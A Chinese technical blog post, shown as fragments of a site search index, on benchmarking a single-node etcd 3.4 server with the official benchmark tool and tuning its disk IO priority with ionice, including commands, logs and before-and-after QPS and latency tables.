","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:5:0","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"benchmark安装 etcd/tools/benchmark 是etcd官方benchmark测试工具 安装命令如下， ","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:6:0","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"get方式 # set myproject go env export GOPATH=/home/wangb/go_projects go get go.etcd.io/etcd/tools/benchmark ls $GOPATH/bin 示例： $ go get go.etcd.io/etcd/tools/benchmark # GOPATH should be set $ ls $GOPATH/bin benchmark ","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:6:1","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"编译方式 如果上面get方式不能成功，则下载etcd源码，进行编译 # 使用go mod # 进入项目根目录，如go_projects/src/etcd-3.4.13 export GO111MODULE=on # export GO111MODULE=off # go env -w GOPROXY=https://goproxy.cn,direct #进入项目目录 #go mod init godev # 下载依赖 go mod tidy # 生成项目vendor go mod vendor # etcd-3.4.13/tools/benchmark cd tools/benchmark go build -o benchmark 示例： (base) [root@yuyuan211 /home/wangb/go_projects/src/etcd-3.4.13/tools/benchmark]# go build -o benchmark (base) [root@yuyuan211 /home/wangb/go_projects/src/etcd-3.4.13/tools/benchmark]# ll total 19080 -rwxr-xr-x. 1 root root 19525385 Jan 18 11:09 benchmark drwxr-xr-x. 2 root root 278 Aug 25 03:11 cmd -rw-r--r--. 1 root root 675 Aug 25 03:11 doc.go -rw-r--r--. 1 root root 784 Aug 25 03:11 main.go -rw-r--r--. 1 root root 284 Aug 25 03:11 README.md ","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:6:2","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"benchmark指标 性能指标说明： 延时 吞吐量 title description Performance Understanding performance: latency \u0026 throughput ","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:7:0","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"benchmark测试 ","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:8:0","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"启动etcd /tmp/etcd-download-test/etcd --name=etcdtest --heartbeat-interval=200 --election-timeout=2000 --snapshot-count=5000 --auto-compaction-retention=1 启动打印 (base) [root@yuyuan211 /home/wangb/etcd-test]# /tmp/etcd-download-test/etcd --name=etcdtest --heartbeat-interval=200 --election-timeout=2000 --snapshot-count=5000 --auto-compaction-retention=1 [WARNING] Deprecated '--logger=capnslog' flag is set; use '--logger=zap' flag instead 2021-01-19 14:34:35.907827 I | etcdmain: etcd Version: 3.4.13 2021-01-19 14:34:35.908025 I | etcdmain: Git SHA: ae9734ed2 2021-01-19 14:34:35.908089 I | etcdmain: Go Version: go1.12.17 2021-01-19 14:34:35.908116 I | etcdmain: Go OS/Arch: linux/amd64 2021-01-19 14:34:35.908144 I | etcdmain: setting maximum number of CPUs to 32, total number of available CPUs is 32 2021-01-19 14:34:35.908186 W | etcdmain: no data-dir provided, using default data-dir ./etcdtest.etcd [WARNING] Deprecated '--logger=capnslog' flag is set; use '--logger=zap' flag instead 2021-01-19 14:34:35.912732 I | embed: name = etcdtest 2021-01-19 14:34:35.912790 I | embed: data dir = etcdtest.etcd 2021-01-19 14:34:35.912833 I | embed: member dir = etcdtest.etcd/member 2021-01-19 14:34:35.912854 I | embed: heartbeat = 200ms 2021-01-19 14:34:35.912873 I | embed: election = 2000ms 2021-01-19 14:34:35.912891 I | embed: snapshot count = 5000 2021-01-19 14:34:35.912944 I | embed: advertise client URLs = http://localhost:2379 2021-01-19 14:34:35.925333 I | etcdserver: starting member 8e9e05c52164694d in cluster cdf818194e3a8c32 raft2021/01/19 14:34:35 INFO: 8e9e05c52164694d switched to configuration voters=() raft2021/01/19 14:34:35 INFO: 8e9e05c52164694d became follower at term 0 raft2021/01/19 14:34:35 INFO: newRaft 8e9e05c52164694d [peers: [], term: 0, commit: 0, applied: 0, lastindex: 0, lastterm: 0] raft2021/01/19 14:34:35 INFO: 8e9e05c52164694d became follower at term 1 raft2021/01/19 14:34:35 INFO: 8e9e05c52164694d switched to configuration voters=(10276657743932975437) 2021-01-19 14:34:35.928869 W | auth: simple token is not cryptographically signed 2021-01-19 14:34:35.933119 I | etcdserver: starting server... [version: 3.4.13, cluster version: to_be_decided] 2021-01-19 14:34:35.933413 I | etcdserver: 8e9e05c52164694d as single-node; fast-forwarding 9 ticks (election ticks 10) raft2021/01/19 14:34:35 INFO: 8e9e05c52164694d switched to configuration voters=(10276657743932975437) 2021-01-19 14:34:35.935531 I | etcdserver/membership: added member 8e9e05c52164694d [http://localhost:2380] to cluster cdf818194e3a8c32 2021-01-19 14:34:35.939938 I | embed: listening for peers on 127.0.0.1:2380 raft2021/01/19 14:34:37 INFO: 8e9e05c52164694d is starting a new election at term 1 raft2021/01/19 14:34:37 INFO: 8e9e05c52164694d became candidate at term 2 raft2021/01/19 14:34:37 INFO: 8e9e05c52164694d received MsgVoteResp from 8e9e05c52164694d at term 2 raft2021/01/19 14:34:37 INFO: 8e9e05c52164694d became leader at term 2 raft2021/01/19 14:34:37 INFO: raft.node: 8e9e05c52164694d elected leader 8e9e05c52164694d at term 2 2021-01-19 14:34:37.328580 I | etcdserver: setting up the initial cluster version to 3.4 2021-01-19 14:34:37.330234 N | etcdserver/membership: set the initial cluster version to 3.4 2021-01-19 14:34:37.330360 I | embed: ready to serve client requests 2021-01-19 14:34:37.330537 I | etcdserver: published {Name:etcdtest ClientURLs:[http://localhost:2379]} to cluster cdf818194e3a8c32 2021-01-19 14:34:37.330575 I | etcdserver/api: enabled capabilities for version 3.4 2021-01-19 14:34:37.332810 N | embed: serving insecure client requests on 127.0.0.1:2379, this is strongly discouraged! 2021-01-19 14:36:58.994204 I | etcdserver: start to snapshot (applied: 5001, lastsnap: 0) 2021-01-19 14:36:58.999539 I | etcdserver: saved snapshot at index 5001 2021-01-19 14:36:59.000747 I | etcdserver: compacted raft log at 1 2021-01-19 14:37:02.580676 I | etcdserver: start to snapshot (applied: 10002, lastsnap: 5001) 2021-01-19 14:37:02.585886 I | etc","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:8:1","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"参数说明 clients：Number of clients： 客户端数量 conns：Number of connections，http连接数量，多个客户端可复用1个连接 total ：Total number of put requests，requests请求数量，即所有客户端的请求总数量，默认值10000 ","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:8:2","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"write测试 With this configuration, etcd can approximately write: Number of keys Key size in bytes Value size in bytes Number of connections Number of clients Target etcd server Average write QPS Average latency per request Average server RSS 10,000 8 256 1 1 leader only 1359 0.7ms 24 MB 100,000 8 256 100 1000 leader only 27507 36ms 75MB 100,000 8 256 100 1000 all members 27206 36.3ms 89MB 说明：这里只有一个etcd节点，所以表格第3行的集群raft测试结果参考意义不大。 Sample commands are: HOST_1=http://127.0.0.1:2379 HOST_2=http://127.0.0.1:2379 HOST_3=http://127.0.0.1:2379 # include benchmark bin path current=`pwd` export PATH=$PATH:$current # write to leader benchmark --endpoints=${HOST_1} --target-leader --conns=1 --clients=1 \\ put --key-size=8 --sequential-keys --total=10000 --val-size=256 benchmark --endpoints=${HOST_1} --target-leader --conns=100 --clients=1000 \\ put --key-size=8 --sequential-keys --total=100000 --val-size=256 # write to all members benchmark --endpoints=${HOST_1},${HOST_2},${HOST_3} --conns=100 --clients=1000 \\ put --key-size=8 --sequential-keys --total=100000 --val-size=256 ","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:8:3","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"read测试 Linearizable read requests go through a quorum of cluster members for consensus to fetch the most recent data. Serializable read requests are cheaper than linearizable reads since they are served by any single etcd member, instead of a quorum of members, in exchange for possibly serving stale data. etcd can read: Number of requests Key size in bytes Value size in bytes Number of connections Number of clients Consistency Average read QPS Average latency per request 10,000 8 256 1 1 Linearizable 1110 0.9ms 10,000 8 256 1 1 Serializable 1251 0.8ms 100,000 8 256 100 1000 Linearizable 9532 0.1044s 100,000 8 256 100 1000 Serializable 11354 0.0875s 说明 由于测试etcd为单节点，所以Linearizable和Serializable特性测试结果差别不大，参考意义不大。 Sample commands are: HOST_1=http://127.0.0.1:2379 HOST_2=http://127.0.0.1:2379 HOST_3=http://127.0.0.1:2379 current=`pwd` export PATH=$PATH:$current read前，先write一个测试key YOUR_KEY=foo /tmp/etcd-download-test/etcdctl --endpoints=localhost:2379 put $YOUR_KEY bar /tmp/etcd-download-test/etcdctl --endpoints=localhost:2379 get $YOUR_KEY 测试命令 # Single connection read requests benchmark --endpoints=${HOST_1},${HOST_2},${HOST_3} --conns=1 --clients=1 \\ range $YOUR_KEY --consistency=l --total=10000 benchmark --endpoints=${HOST_1},${HOST_2},${HOST_3} --conns=1 --clients=1 \\ range $YOUR_KEY --consistency=s --total=10000 # Many concurrent read requests benchmark --endpoints=${HOST_1},${HOST_2},${HOST_3} --conns=100 --clients=1000 \\ range $YOUR_KEY --consistency=l --total=100000 benchmark --endpoints=${HOST_1},${HOST_2},${HOST_3} --conns=100 --clients=1000 \\ range $YOUR_KEY --consistency=s --total=100000 ","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:8:4","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"read-only 时间参数设置优化 read测试时的etcd打印信息 2021-01-18 14:54:58.315985 W | etcdserver: read-only range request \"key:\\\"foo\\\" serializable:true \" with result \"range_response_count:1 size:30\" took too long (128.237385ms) to execute 2021-01-18 14:54:58.316748 W | etcdserver: read-only range request \"key:\\\"foo\\\" serializable:true \" with result \"range_response_count:1 size:30\" took too long (136.434995ms) to execute 2021-01-18 14:54:58.317021 W | etcdserver: read-only range request \"key:\\\"foo\\\" serializable:true \" with result \"range_response_count:1 size:30\" took too long (125.138823ms) to execute 2021-01-18 14:54:58.327063 W | etcdserver: read-only range request \"key:\\\"foo\\\" serializable:true \" with result \"range_response_count:1 size:30\" took too long (113.659252ms) to execute 2021-01-18 14:54:58.327171 W | etcdserver: read-only range request \"key:\\\"foo\\\" serializable:true \" with result \"range_response_count:1 size:30\" took too long (140.480071ms) to execute 2021-01-18 14:54:58.328320 W | etcdserver: read-only range request \"key:\\\"foo\\\" serializable:true \" with result \"range_response_count:1 size:30\" took too long (138.142424ms) to execute 2021-01-18 14:54:58.329457 W | etcdserver: read-only range request \"key:\\\"foo\\\" serializable:true \" with result \"range_response_count:1 size:30\" took too long (136.980041ms) to execute 2021-01-18 14:54:58.330026 W | etcdserver: read-only range request \"key:\\\"foo\\\" serializable:true \" with result \"range_response_count:1 size:30\" took too long (139.674614ms) to execute 2021-01-18 14:54:58.330674 W | etcdserver: read-only range request \"key:\\\"foo\\\" serializable:true \" with result \"range_response_count:1 size:30\" took too long (137.950461ms) to execute 2021-01-18 14:54:58.330710 W | etcdserver: read-only range request \"key:\\\"foo\\\" serializable:true \" with result \"range_response_count:1 size:30\" took too long (151.589201ms) to execute 2021-01-18 14:54:58.338877 W | etcdserver: read-only range request \"key:\\\"foo\\\" serializable:true \" with result \"range_response_count:1 size:30\" took too long (149.623303ms) to execute 2021-01-18 14:54:58.339042 W | etcdserver: read-only range request \"key:\\\"foo\\\" serializable:true \" with result \"range_response_count:1 size:30\" took too long (148.882374ms) to execute 上面的read测试时的etcd打印信息， 会一直输出告警打印信息（包括输出到系统日志中），因为read-only range request \u003e 100ms，导致性能降低 代码中默认值设置为 100ms // v3.3 -\u003e v3.4.14 const ( warnApplyDuration = 100 * time.Millisecond ) // v3.4-master const ( DefaultWarningApplyDuration = 100 * time.Millisecond ) 在etcd-v3.4最新版本(master)添加了参数优化设置，而v3.4.14以前，包括v3.4.14和etcd-v3.3没有办法消除该告警信息打印 同时etcd-3.4版本的模块目录有所调整，所以需要跟踪etcd版本 跟踪etcd版本，是否新增了配置变量ExperimentalWarningApplyDuration，而最新版本不再使用变量WarnApplyDuration，改为WarningApplyDuration WarningApplyDuration 修改参考 srvcfg := etcdserver.ServerConfig{ WarningApplyDuration: cfg.ExperimentalWarningApplyDuration, } ","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:8:5","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"benchmark测试条件 We encourage running the benchmark test when setting up an etcd cluster for the first time in a new environment to ensure the cluster achieves adequate performance; cluster latency and throughput can be sensitive to minor environment differences. ","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:8:6","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"磁盘IO 参数调优 Linux 中 etcd 的磁盘优先级可以使用 ionice 配置： -c class 指定调度类型，0代表none，1代表real time,2代表best effort, 3代表idle-nclassdata 指定优先级 real time和best effor可以使用0-7-p pid 查看或改变已经运行的进程的调度类型和优先级。-t 忽略设置指定优先级的错误信息 ","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:9:0","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"查询命令 ionice -p `pgrep etcd` 原有配置 (base) [root@yuyuan211 ~]# ionice -p `pgrep etcd` unknown: prio 4 ","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:9:1","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"设置命令 Best Effort策略，优先级为0（优先级最高） # best effort, highest priority ionice -c2 -n0 -p `pgrep etcd` ionice -p `pgrep etcd` 优化配置 (base) [root@yuyuan211 ~]# ionice -c2 -n0 -p `pgrep etcd` (base) [root@yuyuan211 ~]# (base) [root@yuyuan211 ~]# ionice -p `pgrep etcd` best-effort: prio 0 (base) [root@yuyuan211 ~]# ","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:9:2","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"优化后测试 说明 为了在相同环境下对比测试，把之前测试数据文件etcdtest.etcd全部删除 read测试时，测试键值key，可以不预置，这样read测试为极限值 (base) [root@yuyuan211 /home/wangb/etcd-test]# ll total 19068 -rwxr-xr-x. 1 root root 19525385 Jan 18 11:36 benchmark drwxr-xr-x. 3 root root 151 Jan 18 11:37 etcd-download-test drwx------. 3 root root 28 Jan 18 13:46 etcdtest.etcd (base) [root@yuyuan211 /home/wangb/etcd-test]# (base) [root@yuyuan211 /home/wangb/etcd-test]# (base) [root@yuyuan211 /home/wangb/etcd-test]# (base) [root@yuyuan211 /home/wangb/etcd-test]# rm -rf etcdtest.etcd (base) [root@yuyuan211 /home/wangb/etcd-test]# write测试 Sample commands are: HOST_1=http://127.0.0.1:2379 HOST_2=http://127.0.0.1:2379 HOST_3=http://127.0.0.1:2379 # include benchmark bin path current=`pwd` export PATH=$PATH:$current # write to leader benchmark --endpoints=${HOST_1} --target-leader --conns=1 --clients=1 \\ put --key-size=8 --sequential-keys --total=10000 --val-size=256 benchmark --endpoints=${HOST_1} --target-leader --conns=100 --clients=1000 \\ put --key-size=8 --sequential-keys --total=100000 --val-size=256 # write to all members benchmark --endpoints=${HOST_1},${HOST_2},${HOST_3} --conns=100 --clients=1000 \\ put --key-size=8 --sequential-keys --total=100000 --val-size=256 With this configuration, etcd can approximately write: Number of keys Key size in bytes Value size in bytes Number of connections Number of clients Target etcd server Average write QPS Average latency per request 10,000 8 256 1 1 leader only 1357 0.7ms 100,000 8 256 100 1000 leader only 28232 35.1ms 100,000 8 256 100 1000 all members 27620 35.9ms read测试 测试命令 HOST_1=http://127.0.0.1:2379 HOST_2=http://127.0.0.1:2379 HOST_3=http://127.0.0.1:2379 # include benchmark bin path current=`pwd` export PATH=$PATH:$current # Single connection read requests benchmark --endpoints=${HOST_1},${HOST_2},${HOST_3} --conns=1 --clients=1 \\ range $YOUR_KEY --consistency=l --total=10000 benchmark --endpoints=${HOST_1},${HOST_2},${HOST_3} --conns=1 --clients=1 \\ range $YOUR_KEY --consistency=s --total=10000 # Many concurrent read requests benchmark --endpoints=${HOST_1},${HOST_2},${HOST_3} --conns=100 --clients=1000 \\ range $YOUR_KEY --consistency=l --total=100000 benchmark --endpoints=${HOST_1},${HOST_2},${HOST_3} --conns=100 --clients=1000 \\ range $YOUR_KEY --consistency=s --total=100000 Number of requests Key size in bytes Value size in bytes Number of connections Number of clients Consistency Average read QPS Average latency per request 10,000 8 256 1 1 Linearizable 1272 0.8ms 10,000 8 256 1 1 Serializable 1432 0.7ms 100,000 8 256 100 1000 Linearizable 13108 0.0758s 100,000 8 256 100 1000 Serializable 16088 0.0617s 对比结果 write对比 Number of keys Key size in bytes Value size in bytes Number of connections Number of clients Target etcd server Average write QPS Average latency per request Tunning 10,000 8 256 1 1 leader only 1359 0.7ms false 10,000 8 256 1 1 leader only 1382 0.7ms true 100,000 8 256 100 1000 leader only 27507 36ms false 100,000 8 256 100 1000 leader only 28381 34.8ms true 100,000 8 256 100 1000 all members 27206 36.3ms false 100,000 8 256 100 1000 all members 27855 35.6ms true read对比 Number of requests Key size in bytes Value size in bytes Number of connections Number of clients Consistency Average read QPS Average latency per request Tunning 10,000 8 256 1 1 Linearizable 1110 0.9ms false 10,000 8 256 1 1 Linearizable 1272 0.8ms true 10,000 8 256 1 1 Serializable 1251 0.8ms false 10,000 8 256 1 1 Serializable 1432 0.7ms true 100,000 8 256 100 1000 Linearizable 9532 0.1044s false 100,000 8 256 100 1000 Linearizable 13108 0.0758s true 100,000 8 256 100 1000 Serializable 11354 0.0875s false 100,000 8 256 100 1000 Serializable 16088 0.0617s true ","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:9:3","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"结论 磁盘IO参数可以优化etcd性能，write和read接口指标改善 快照和数据压缩参数，可以减少etcd的内存和磁盘占用量 ","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:10:0","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"附录 etcd benchmarks etcd-3-demo-benchmarks ","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:11:0","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"Linearizability Linearizability (also known as Atomic Consistency or External Consistency) is a consistency level between strict consistency and sequential consistency. For linearizability, suppose each operation receives a timestamp from a loosely synchronized global clock. Operations are linearized if and only if they always complete as though they were executed in a sequential order and each operation appears to complete in the order specified by the program. Likewise, if an operation’s timestamp precedes another, that operation must also precede the other operation in the sequence. For example, consider a client completing a write at time point 1 (t1). A client issuing a read at t2 (for t2 \u003e t1) should receive a value at least as recent as the previous write, completed at t1. However, the read might actually complete only by t3. Linearizability guarantees the read returns the most current value. Without linearizability guarantee, the returned value, current at t2 when the read began, might be “stale” by t3 because a concurrent write might happen between t2 and t3. etcd does not ensure linearizability for watch operations. Users are expected to verify the revision of watch responses to ensure correct ordering. etcd ensures linearizability for all other operations by default. Linearizability comes with a cost, however, because linearized requests must go through the Raft consensus process. To obtain lower latencies and higher throughput for read requests, clients can configure a request’s consistency mode to serializable, which may access stale data with respect to quorum, but removes the performance penalty of linearized accesses' reliance on live consensus. 线性化（也称为原子一致性或外部一致性）是严格一致性和顺序一致性之间的一致性级别。 对于线性化，假设每个操作从松散同步的全局时钟接收一个时间戳。当且仅当操作总是像按顺序执行一样完成，并且每个操作似乎按程序指定的顺序完成时，才线性化操作。同样，如果一个操作的时间戳先于另一个操作，那么该操作也必须先于序列中的另一个操作。 例如，假设客户机在时间点1（t1）完成写入。在t2发出read（对于t2\u003et1）的客户机应至少收到与在t1完成的上一次写入相同的最新值。然而，读取实际上可能只在t3之前完成。线性化保证读取返回最新值。如果没有线性化保证，返回值（读取开始时t2处的当前值）可能会被t3“过时”，因为t2和t3之间可能发生并发写入。 etcd不能确保监视操作的线性化。用户需要验证监视响应的修订，以确保正确排序。 默认情况下，etcd可确保所有其他操作的线性化。然而，线性化是有代价的，因为线性化的请求必须经过协商一致的过程。为了获得较低的延迟和较高的读请求吞吐量，客户机可以将请求的一致性模式配置为可串行化，这可能会访问有关仲裁的过时数据，但消除了线性化访问依赖实时一致性的性能损失。 ","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:11:1","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"测试记录 write测试 表格第1行测试数据 (base) [root@yuyuan211 /home/wangb/etcd-test]# benchmark --endpoints=${HOST_1} --target-leader --conns=1 --clients=1 \\ \u003e put --key-size=8 --sequential-keys --total=10000 --val-size=256 10000 / 10000 Booooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo! 100.00% 7s Summary: Total: 7.3535 secs. Slowest: 0.0048 secs. Fastest: 0.0003 secs. Average: 0.0007 secs. Stddev: 0.0003 secs. Requests/sec: 1359.9057 Response time histogram: 0.0003 [1] | 0.0008 [7950] |∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎ 0.0012 [1535] |∎∎∎∎∎∎∎ 0.0016 [240] |∎ 0.0021 [152] | 0.0025 [53] | 0.0030 [33] | 0.0034 [20] | 0.0039 [10] | 0.0043 [3] | 0.0048 [3] | Latency distribution: 10% in 0.0006 secs. 25% in 0.0006 secs. 50% in 0.0006 secs. 75% in 0.0007 secs. 90% in 0.0010 secs. 95% in 0.0012 secs. 99% in 0.0022 secs. 99.9% in 0.0037 secs. (base) [root@yuyuan211 /home/wangb/etcd-test]# (base) [root@yuyuan211 /home/wangb/etcd-test]# ps aux |grep etcd root 29017 1.9 0.0 10616300 24752 pts/10 Sl+ 13:46 0:14 /tmp/etcd-download-test/etcd --name=etcdtest --heartbeat-interval=200 --election-timeout=2000 --snapshot-count=5000 表格第2行测试数据 (base) [root@yuyuan211 /home/wangb/etcd-test]# benchmark --endpoints=${HOST_1} --target-leader --conns=100 --clients=1000 \\ \u003e put --key-size=8 --sequential-keys --total=100000 --val-size=256 INFO: 2021/01/18 14:00:00 parsed scheme: \"endpoint\" INFO: 2021/01/18 14:00:00 ccResolverWrapper: sending new addresses to cc: [{http://localhost:2379 \u003cnil\u003e 0 \u003cnil\u003e}] 100000 / 100000 Booooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo! 100.00% 3s Summary: Total: 3.5391 secs. Slowest: 0.0837 secs. Fastest: 0.0035 secs. Average: 0.0351 secs. Stddev: 0.0109 secs. Requests/sec: 28255.6626 Response time histogram: 0.0035 [1] | 0.0116 [1] | 0.0196 [1298] |∎ 0.0276 [25892] |∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎ 0.0356 [34394] |∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎ 0.0436 [15557] |∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎ 0.0517 [14631] |∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎ 0.0597 [5577] |∎∎∎∎∎∎ 0.0677 [1873] |∎∎ 0.0757 [428] | 0.0837 [348] | Latency distribution: 10% in 0.0235 secs. 25% in 0.0272 secs. 50% in 0.0318 secs. 75% in 0.0424 secs. 90% in 0.0504 secs. 95% in 0.0550 secs. 99% in 0.0665 secs. 99.9% in 0.0812 secs. (base) [root@yuyuan211 /home/wangb/etcd-test]# (base) [root@yuyuan211 /home/wangb/etcd-test]# ps aux |grep etcd root 29017 6.6 0.2 10687728 75552 pts/10 Sl+ 13:46 0:56 /tmp/etcd-download-test/etcd --name=etcdtest --heartbeat-interval=200 --election-timeout=2000 --snapshot-count=5000 表格第3行测试数据 (base) [root@yuyuan211 /home/wangb/etcd-test]# benchmark --endpoints=${HOST_1},${HOST_2},${HOST_3} --conns=100 --clients=1000 \\ \u003e put --key-size=8 --sequential-keys --total=100000 --val-size=256 INFO: 2021/01/18 14:11:16 ccResolverWrapper: sending new addresses to cc: [{http://127.0.0.1:2379 \u003cnil\u003e 0 \u003cnil\u003e}] 100000 / 100000 Booooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo! 100.00% 3s Summary: Total: 3.5622 secs. Slowest: 0.0836 secs. Fastest: 0.0123 secs. Average: 0.0353 secs. Stddev: 0.0109 secs. Requests/sec: 28072.8070 Response time 